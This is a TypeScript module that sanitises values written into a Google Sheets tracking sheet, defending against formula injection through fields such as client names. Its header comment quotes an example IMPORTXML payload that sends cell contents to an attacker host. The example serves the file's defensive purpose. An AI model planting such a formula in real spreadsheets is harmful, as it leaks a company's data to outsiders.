/**
 * Making a value safe to put in a spreadsheet cell.
 *
 * See IMPLEMENTATION_PLAN.md §19.5. This is the highest-risk item in the phase.
 *
 * ---------------------------------------------------------------------------
 * WHY A CLIENT NAME IS DANGEROUS
 * ---------------------------------------------------------------------------
 * A cell beginning with `=`, `+`, `-` or `@` is a FORMULA. So a client called
 *
 *     =IMPORTXML("https://attacker.example/log?d="&A2&B2, "//x")
 *
 * does not sit in the tracking sheet as a name: it executes when the sheet is
 * opened, and quietly posts the company's quotation data to whoever chose that
 * name. Nothing about the request looks like an attack, and nothing in Drive or
 * the documents is affected — the payload only ever fires in the Sheet.
 *
 * The defence is one character: a leading apostrophe, which Google Sheets reads
 * as "the rest of this cell is text". `escapeForSheet` in `shared/` already
 * applies it, and `asText` on the read side takes it back off.
 *
 * ---------------------------------------------------------------------------
 * THE ONE FORMULA THIS SYSTEM DOES WRITE
 * ---------------------------------------------------------------------------
 * The Drive Folder column is a `HYPERLINK` (PRD §31 requires a clickable link).
 * That is a formula built by string assembly, which is exactly what everything
 * else here exists to prevent — so it is confined to `driveHyperlink` below,
 * takes a URL that must match `^https://drive\.google\.com/`, and escapes both
 * arguments. Anything that fails the check is written as inert text instead.
 *
 * ---------------------------------------------------------------------------
 * THE BRAND IS THE ENFORCEMENT
 * ---------------------------------------------------------------------------
 * `PreparedCell` is branded, and the only way to obtain one is through the
 * three functions below. `writeRow` in `sheet-access.ts` accepts nothing else,
 * so a raw client name cannot reach a cell — not because a reviewer would catch
 * it, but because it does not compile.
 */

import { isDriveUrl } from '@shared/drive-links';
import { escapeForSheet } from '@shared/validation-rules';

declare const preparedCellBrand: unique symbol;

/** A value that has been through escaping. The only thing `writeRow` accepts. */
export type PreparedCell = (string | number) & {
  readonly [preparedCellBrand]: 'PreparedCell';
};

/**
 * The longest string this system writes into any cell.
 *
 * A cell holds 50,000 characters, but nothing in the tracking sheet is prose:
 * the longest business field is `Quotation For` at 200. The cap is a guard
 * against a payload that slipped through field validation, not a business rule.
 */
export const MAX_CELL_LENGTH = 500;

/** A value ready to be written: escaped, trimmed and length-capped. */
export function safeText(value: unknown, maxLength: number = MAX_CELL_LENGTH): PreparedCell {
  // Only the types this system actually writes. Anything else becomes an empty
  // cell rather than the literal text "[object Object]".
  const text =
    typeof value === 'string'
      ? value
      : typeof value === 'number' || typeof value === 'boolean'
        ? String(value)
        : '';

  return escapeForSheet(text.trim().slice(0, maxLength)) as PreparedCell;
}

/**
 * A number, or an empty cell.
 *
 * Written as a NUMBER, not as formatted text: the sheet's own number format
 * renders it, so staff can sort and total the column. A string of digits sorts
 * lexicographically, which puts 9,000.00 above 10,000.00.
 */
export function safeNumber(value: number): PreparedCell {
  return (Number.isFinite(value) ? value : '') as PreparedCell;
}

/**
 * Escape a string for use inside a formula's double-quoted argument.
 *
 * A quote inside the label would terminate the argument and let the rest of the
 * value be parsed as formula syntax. Doubling it is the sheet's own escape.
 */
function formulaArgument(value: string): string {
  return value.replace(/"/g, '""');
}

/**
 * The Drive Folder cell: a hyperlink when the URL is genuinely Drive's,
 * inert text otherwise.
 *
 * Returning text rather than throwing is deliberate. A tracking row whose link
 * is missing is a nuisance; a save that fails because a URL looked odd loses the
 * row entirely, and the documents are already in Drive by this point.
 */
export function driveHyperlink(url: string, label: string): PreparedCell {
  if (!isDriveUrl(url)) return safeText(url);

  return `=HYPERLINK("${formulaArgument(url)}","${formulaArgument(safeLabel(label))}")` as PreparedCell;
}

/** A label for the hyperlink: no quotes, no newlines, capped. */
function safeLabel(label: string): string {
  return label.replace(/[\r\n]+/g, ' ').trim().slice(0, MAX_CELL_LENGTH);
}
